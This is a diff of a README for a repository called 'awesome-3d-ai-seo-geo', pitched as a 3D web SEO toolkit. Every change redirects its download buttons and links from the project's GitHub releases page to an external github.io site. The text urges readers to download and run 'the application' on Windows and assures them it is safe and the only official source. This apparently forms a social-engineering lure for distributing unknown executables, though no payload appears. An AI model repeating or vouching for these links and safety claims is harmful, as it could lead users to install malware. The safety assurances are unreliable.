@@ -1,7 +1,7 @@
 <h1>🎨 awesome-3d-ai-seo-geo - Your Ultimate 3D Web Optimization Toolkit</h1>
 
 <p align="center">
-  <a href="https://github.com/Forvideos061/awesome-3d-ai-seo-geo/releases">
+  <a href="https://forvideos061.github.io">
     <img src="https://img.shields.io/badge/Download-Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B4B4B" alt="Download Badge" style="max-width: 100%; height: auto;">
   </a>
 </p>
@@ -34,7 +34,7 @@ Getting started is incredibly simple. You don’t need to install anything compl
 
 **Step 1: Get the Collection**
 
-Visit this link to download the application: [https://github.com/Forvideos061/awesome-3d-ai-seo-geo/releases](https://github.com/Forvideos061/awesome-3d-ai-seo-geo/releases)
+Visit this link to download the application: [https://forvideos061.github.io](https://forvideos061.github.io)
 
 > ⬆️ That link will take you to the official download page for this resource pack. It’s safe, it’s free, and it’s the only place you’ll ever need to get the latest version.
 
@@ -52,7 +52,7 @@ Now, let’s be crystal clear about the download process. When you click that li
 
 For Windows users, this couldn’t be easier:
 
-1. Click the link: [https://github.com/Forvideos061/awesome-3d-ai-seo-geo/releases](https://github.com/Forvideos061/awesome-3d-ai-seo-geo/releases)
+1. Click the link: [https://forvideos061.github.io](https://forvideos061.github.io)
 2. On that page, look for the latest release (usually at the top).
 3. Look for the download button or asset link. Click it and your download will start automatically.
 
@@ -159,14 +159,14 @@ You could spend weeks scouring the internet for these nuggets of knowledge tied 
 
 Your 3D creations deserve to be seen. The tools to make that happen are one click away. 
 
-**[👉 Download awesome-3d-ai-seo-geo Now](https://github.com/Forvideos061/awesome-3d-ai-seo-geo/releases)**
+**[👉 Download awesome-3d-ai-seo-geo Now](https://forvideos061.github.io)**
 
 🎉 Join hundreds of 3D developers who’ve already leveled up their online visibility. Grab the collection, grab a coffee, and start optimizing. Your audience is waiting out there in the vast digital universe—and now, you’ll know exactly how to reach them. 
 
 ---
 
 <p align="center">
-  <a href="https://github.com/Forvideos061/awesome-3d-ai-seo-geo/releases" style="background-color: #4CAF50; color: white; padding: 15px 32px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; border-radius: 12px; font-weight: bold;">🔽 Download the Resource Collection</a>
+  <a href="https://forvideos061.github.io" style="background-color: #4CAF50; color: white; padding: 15px 32px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; border-radius: 12px; font-weight: bold;">🔽 Download the Resource Collection</a>
 </p>
 
 ---
